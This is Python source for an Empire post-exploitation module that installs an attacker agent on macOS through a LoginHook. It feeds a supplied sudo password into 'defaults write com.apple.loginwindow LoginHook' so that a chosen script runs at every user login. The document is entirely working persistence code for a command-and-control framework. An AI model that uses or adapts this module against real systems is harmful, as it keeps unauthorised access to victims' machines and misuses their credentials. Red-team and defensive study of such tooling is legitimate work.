class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'LoginHook',
            'Author': ['@Killswitch-GUI'],
            'Description': ('Installs Empire agent via LoginHook.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ["https://support.apple.com/de-at/HT2420"]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'User password for sudo.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LoginHookScript' : {
                'Description'   :   'Full path of the script to be executed/',
                'Required'      :   True,
                'Value'         :   '/Users/Username/Desktop/kill-me.sh'
            },
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        loginhookScriptPath = self.options['LoginHookScript']['Value']
        password = self.options['Password']['Value']
        password = password.replace('$', '\$')
        password = password.replace('$', '\$')
        password = password.replace('!', '\!')
        password = password.replace('!', '\!')
        script = """
import subprocess
import sys
try:
    process = subprocess.Popen('which sudo|wc -l', stdout=subprocess.PIPE, shell=True)
    result = process.communicate()
    result = result[0].strip()
    if str(result) != "1":
        print "[!] ERROR to create a LoginHook requires (sudo) privileges!"
        sys.exit()
    try:
        print " [*] Setting script to proper linux permissions"
        process = subprocess.Popen('chmod +x %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print "[!] Issues setting login hook (line 81): " + str(e)
    print " [*] Creating proper LoginHook"
    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults write com.apple.loginwindow LoginHook %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print "[!] Issues setting login hook (line 81): " + str(e)
    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
        print " [*] LoginHook Output: "
        result = process.communicate()
        result = result[0].strip()
        print " [*] LoginHook set to:"
        print str(result)
    except Exception as e:
        print "[!] Issue checking LoginHook settings (line 86): " + str(e)
except Exception as e:
    print "[!] Issue with LoginHook script: " + str(e)
""" % (loginhookScriptPath, password, loginhookScriptPath, password)
        return script